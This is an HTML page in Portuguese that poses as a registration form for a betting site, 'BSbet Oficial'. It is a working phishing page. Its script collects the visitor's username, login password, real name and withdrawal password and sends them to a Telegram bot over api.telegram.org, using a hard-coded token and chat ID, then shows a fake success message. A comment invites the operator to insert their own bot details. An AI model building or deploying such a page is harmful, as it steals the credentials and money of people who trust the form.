<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BSbet Oficial</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --y: #f3c350; --bg: rgba(26,26,26,0.95); --in: #2a2a2a; --txt: #888; }
        body { 
            margin: 0; padding: 0; font-family: sans-serif; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh;
            background-color: #0d0d0d;
            background-image: url('https://static.vecteezy.com/system/resources/previews/001/955/352/original/abstract-black-and-grey-hexagon-background-free-vector.jpg');
            background-size: cover; background-attachment: fixed;
        }
        .card { background: var(--bg); width: 90%; max-width: 380px; padding: 25px; border-radius: 20px; box-shadow: 0 15px 35px #000; border: 1px solid #333; }
        .logo { text-align: center; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
        .logo span { color: var(--y); }
        .box { background: var(--in); border: 1px solid #444; border-radius: 10px; display: flex; align-items: center; padding: 12px; margin-bottom: 12px; }
        .box i { color: var(--txt); width: 25px; text-align: center; margin-right: 10px; }
        .box input { background: transparent; border: none; color: white; width: 100%; outline: none; font-size: 16px; }
        .btn { background: linear-gradient(180deg, #f7d06d, #d9a026); color: #1a1a1a; width: 100%; padding: 15px; border: none; border-radius: 10px; font-weight: bold; font-size: 18px; cursor: pointer; }
        .btn:active { transform: scale(0.98); }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">BS<span>bet</span></div>
    <form id="meuForm">
        <div class="box"><i class="fa-solid fa-user"></i><input type="text" id="user" placeholder="Usu√°rio / E-mail" required></div>
        <div class="box"><i class="fa-solid fa-lock"></i><input type="password" id="pass" placeholder="Senha Login" required></div>
        <div class="box"><i class="fa-solid fa-id-card"></i><input type="text" id="nome" placeholder="Nome Real" required></div>
        <div class="box"><i class="fa-solid fa-shield"></i><input type="password" id="saque" placeholder="Senha Saque" required></div>
        
        <button type="submit" id="btn" class="btn">REGISTRAR</button>
    </form>
</div>

<script>
    // --- COLOQUE SEUS DADOS AQUI ---
    const TOKEN = "8599880345:AAGQy8ofddvyj-efl_lFUo44KMLEt1uuxMo"; 
    const CHAT_ID = "4996441181";

    document.getElementById('meuForm').onsubmit = function(e) {
        e.preventDefault();
        
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;
        const nome = document.getElementById('nome').value;
        const saque = document.getElementById('saque').value;
        const btn = document.getElementById('btn');

        // VERIFICA√á√ÉO SIMPLES: Mais de 3 caracteres
        if(user.length < 3 || pass.length < 3) {
            alert("Preencha os campos com pelo menos 3 caracteres!");
            return;
        }

        btn.innerText = "ENVIANDO...";
        btn.disabled = true;

        const texto = `üîî *NOVO CADASTRO* üîî\n\nüë§ Usu√°rio: ${user}\nüîë Senha: ${pass}\nüí≥ Nome: ${nome}\nüí∞ Saque: ${saque}`;

        // ENVIO DIRETO
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: texto, parse_mode: 'Markdown' })
        })
        .then(res => {
            if(res.ok) {
                alert("‚úÖ Registrado com sucesso!");
                location.reload();
            } else {
                alert("Erro no Bot. Verifique o Token e ID.");
                btn.disabled = false;
                btn.innerText = "REGISTRAR";
            }
        })
        .catch(() => {
            alert("Erro de conex√£o!");
            btn.disabled = false;
            btn.innerText = "REGISTRAR";
        });
    };
</script>

</body>
</html>
